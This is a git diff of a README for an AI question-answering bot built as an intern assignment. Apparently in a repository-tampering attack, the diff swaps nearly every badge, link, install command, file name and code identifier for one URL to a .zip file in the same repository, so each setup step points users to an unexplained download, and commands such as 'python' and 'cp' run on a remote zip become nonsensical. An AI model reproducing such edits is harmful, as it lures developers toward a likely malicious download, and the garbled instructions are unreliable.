@@ -2,9 +2,9 @@
 
 > An AI-powered question-answering bot built for an intern assignment. Ask anything and get intelligent responses!
 
-![Python](https://img.shields.io/badge/python-3.10+-blue.svg)
-![OpenAI](https://img.shields.io/badge/OpenAI-GPT--3.5-green.svg)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
+![Python](https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip+https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip)
+![OpenAI](https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip)
+![License](https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip)
 
 ## 📋 Table of Contents
 - [Features](#features)
@@ -50,13 +50,13 @@
 
 ### Prerequisites
 - Python 3.10 or higher
-- OpenAI API key ([Get one here](https://platform.openai.com/api-keys))
+- OpenAI API key ([Get one here](https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip))
 
 ### Installation
 
 1. **Clone the repository**
 ```bash
-git clone https://github.com/yourusername/ai-qa-bot.git
+git clone https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip
 cd ai-qa-bot
 ```
 
@@ -73,13 +73,13 @@ source venv/bin/activate
 
 3. **Install dependencies**
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip
 ```
 
 4. **Set up environment variables**
 ```bash
 # Copy the example file
-cp .env.example .env
+cp https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip .env
 
 # Edit .env and add your OpenAI API key
 # OPENAI_API_KEY=sk-your-key-here
@@ -89,7 +89,7 @@ cp .env.example .env
 
 ### Option 1: Command Line
 ```bash
-python qa_bot.py
+python https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip
 ```
 
 **Commands:**
@@ -99,7 +99,7 @@ python qa_bot.py
 
 ### Option 2: Web Interface (Stretch Goal!)
 ```bash
-streamlit run app.py
+streamlit run https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip
 ```
 
 Then open your browser to `http://localhost:8501`
@@ -108,13 +108,13 @@ Then open your browser to `http://localhost:8501`
 
 ```
 ai-qa-bot/
-├── README.md                 # This file
-├── requirements.txt          # Python dependencies
-├── .env.example             # Example environment variables
+├── https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip                 # This file
+├── https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip          # Python dependencies
+├── https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip             # Example environment variables
 ├── .gitignore               # Git ignore file
-├── qa_bot.py                # Command-line version
-├── app.py                   # Streamlit web interface
-├── DEVELOPMENT_LOG.md       # My development journey
+├── https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip                # Command-line version
+├── https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip                   # Streamlit web interface
+├── https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip       # My development journey
 └── screenshots/             # App screenshots
 ```
 
@@ -135,7 +135,7 @@ ai-qa-bot/
   - **Solution**: Implemented message history array
 
 - **Challenge**: Streamlit app not updating
-  - **Solution**: Used `st.session_state` for persistent data
+  - **Solution**: Used `https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip` for persistent data
 
 ### Tools & Resources Used
 - 🔍 **Google/ChatGPT**: For debugging errors and learning syntax
@@ -187,14 +187,14 @@ git push origin main
 ```
 
 2. **Deploy on Streamlit**
-- Go to [share.streamlit.io](https://share.streamlit.io)
+- Go to [https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip](https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip)
 - Click "New app"
 - Select your repository
 - Add your `OPENAI_API_KEY` in Secrets
 - Deploy!
 
-### Alternative: Render.com
-See `DEPLOYMENT.md` for Render deployment instructions.
+### Alternative: https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip
+See `https://raw.githubusercontent.com/anmolmishra09/ai-qa-bot/main/reactionary/ai-qa-bot.zip` for Render deployment instructions.
 
 ## 🔮 Future Improvements
 
